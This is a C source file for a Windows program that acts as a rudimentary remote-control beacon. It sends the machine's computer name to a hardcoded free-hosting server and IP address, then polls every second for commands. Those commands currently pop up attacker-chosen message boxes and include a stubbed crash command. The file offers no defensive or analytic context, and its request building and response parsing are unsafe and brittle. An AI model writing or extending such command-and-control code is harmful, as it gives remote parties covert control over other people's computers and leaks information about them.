#include <stdlib.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#pragma comment(lib, "user32")
#pragma comment(lib, "Ws2_32.lib")
enum SERVER_COMMAND {
    CMD_MSG = 0,
    CMD_CRASH = 1,
    CMD_PING = 2,
    CMD_LIST_USERS = 99,
    CMD_QUERY_PENDING_CMD = 100,
    CMD_REGISTER_USER = 101,
};

#define HOST "000webhostapp.com"

UINT64 UserId = 0;


void ShowMsg(char* Title, char* Msg) {
    MessageBoxA(NULL, Msg, Title, MB_OK);
}

char req[2048] = {0};
char response[0x20002] = {0};
char* uagent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
void TcpInit() {
    WSADATA WsaData;
    int res = WSAStartup(MAKEWORD(2, 2), &WsaData);
    if(res != 0) exit(-1);
}



void ServerRequest(int Cmd, char* arg0, char* arg1, char** Buffer) {
    memset(response, 0, 0x20000);
    SOCKET Socket;
    PADDRINFOA addr;

    int res = getaddrinfo("145.14.145.86", "80", 0, &addr);
    if(res != 0) exit(-2);

    Socket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
    if(Socket == INVALID_SOCKET) exit(-3);


    sprintf_s(req, 2048, "POST /?cmd=%u&uid=%lld&arg0=%s&arg1=%s HTTP/1.1\nUser-Agent: %s\nconnection: close\ncontent-length:0\nhost: molakimtaypointi.000webhostapp.com\naccept:*/*\n\n", Cmd, UserId, arg0, arg1, uagent);
    
    res = connect(Socket, addr->ai_addr, addr->ai_addrlen);
    if(res != 0) exit(-4);
    send(Socket, req, strlen(req), 0);
    int length;
    recv(Socket, response, 0x20000, 0);
    closesocket(Socket);
    char* b = response;
    for(;;) {
        if(memcmp(b, "\r\n\r\n", 4) == 0) {
            b+=7;
            break;
        }else b++;
    }
    *Buffer = b;
}

char  ComputerName[121] = {0};
// returns RequestedCmd (-1 if no cmd is pending)
int QueryPendingCmd(char** _arg0, char** _arg1) {

    char* buff;
    ServerRequest(CMD_QUERY_PENDING_CMD, "", "", &buff);
    UINT64 Cmd = _strtoui64(buff, NULL, 10);
    if(Cmd == 200) {
        printf("No pending...\n");
        return -1;
    } else if(Cmd == 401 || Cmd == 500) {
        printf("Server error...\n");
        return -1;
    }
// CMD Format : cmd\narg0\narg1
    char* arg0, *arg1;

    while(*buff++) {
        if(*buff == '\n') {
            arg0 = buff + 1;
            break;
        }
    }
    
    while(*buff++) {
        if(*buff == '\n') {
            *buff = 0;
            buff++;
            arg1 = buff;
            break;
        }
    }
    //arg1 end
    while(*buff++) {
        if(*buff == '\r') {
            *buff = 0;
            break;
        }
    }
    *_arg0 = arg0;
    *_arg1 = arg1;
    printf("Cmd : %llu , arg0 : %s , arg1 : %s\n", Cmd, arg0, arg1);
    
    return Cmd;
}



// int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPWSTR lpCmdLine, int nCmdShow) {
int main() {
    TcpInit();
    DWORD MaxChars = 120;
    GetComputerNameA(ComputerName, &MaxChars);
    printf("Computer name : %s\n", ComputerName);
    char* buff;
    ServerRequest(CMD_REGISTER_USER, ComputerName, "", &buff);
    UserId = _strtoui64(buff, NULL, 10);
    printf("User Id : %llu\n", UserId);

    char* arg0, *arg1;

    for(;;) {
        int Cmd = QueryPendingCmd(&arg0, &arg1);
        switch(Cmd) {
            case CMD_MSG:{
                MessageBoxA(NULL, arg1, arg0, MB_OK);
                break;
            }
            case CMD_CRASH: {
                break;
            }
            default: break;
        }
        Sleep(1000);
    }
    return 0;
}